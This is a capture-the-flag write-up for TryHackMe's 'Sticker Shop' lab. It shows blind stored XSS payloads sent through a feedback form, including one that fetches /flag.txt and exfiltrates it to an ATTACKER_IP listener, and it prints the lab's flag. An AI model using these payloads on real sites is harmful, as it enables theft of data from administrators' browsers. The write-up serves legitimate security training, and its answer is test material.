# The Sticker Shop — TryHackMe Writeup

**Target:** The Sticker Shop  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web, XSS  

---

## Recon

```
22/tcp    open  ssh   OpenSSH 8.2p1 Ubuntu
8080/tcp  open  http  Werkzeug httpd 3.0.1 (Python 3.8.10)
```

No robots.txt, no interesting directories found. Port 8080 runs a Python web app.

### Key Hint

> "They decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback."

This suggests a **Blind Stored XSS** vulnerability where JavaScript executes in the administrator's browser running on the same host as the server. Since the admin browser and the web server share the same machine, relative paths like `/flag.txt` resolve to localhost — allowing access to internally restricted resources.

---

## Vulnerability — Blind Stored XSS

The `/submit_feedback` endpoint accepts user input that is later rendered and processed server-side (i.e., reviewed by the "admin" on the same machine).

### Step 1 — Verify Blind XSS

Start a local HTTP server:

```bash
python3 -m http.server 8000
```

Submit a test payload via the feedback form:

```
&lt;img src="http://ATTACKER_IP:8000/test"&gt;
```

Incoming request on the listener confirms XSS execution:

```
::ffff:10.49.133.57 - - "GET /test HTTP/1.1" 404 -
```

Blind XSS confirmed — the server is fetching our URL.

### Step 2 — Exfiltrate `/flag.txt`

Since the XSS executes in the context of the target machine (localhost), `fetch('/flag.txt')` will resolve to `http://localhost:8080/flag.txt` — a resource only accessible locally.

Submit the following payload:

```
<img src=x onerror="
fetch('/flag.txt')
.then(r=>r.text())
.then(x=>new Image().src='http://ATTACKER_IP:8000/?f='+x)
">
```

### Step 3 — Catch the Flag

Incoming request on the listener:

```
::ffff:10.49.133.57 - - "GET /?f=THM{83789a69074f636f64a38879cfcabe8b62305ee6} HTTP/1.1" 200 -
```

---

## Flag

```
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

---

## Summary

| Step           | Technique                              |
|----------------|----------------------------------------|
| Recon          | Port scan, read lab context            |
| Identification | Blind XSS via feedback form            |
| Verification   | img src probe to attacker server       |
| Exploit        | `fetch('/flag.txt')` → exfil via image |
| Flag           | Captured on attacker HTTP listener ✅  |

## Takeaway

When an application processes user-submitted content server-side (e.g., admin review), Blind Stored XSS can be used to access internal resources when executed in a privileged browser context. If the admin browser runs on the same host as the web server, relative paths like `/flag.txt` resolve locally — bypassing external access restrictions entirely.

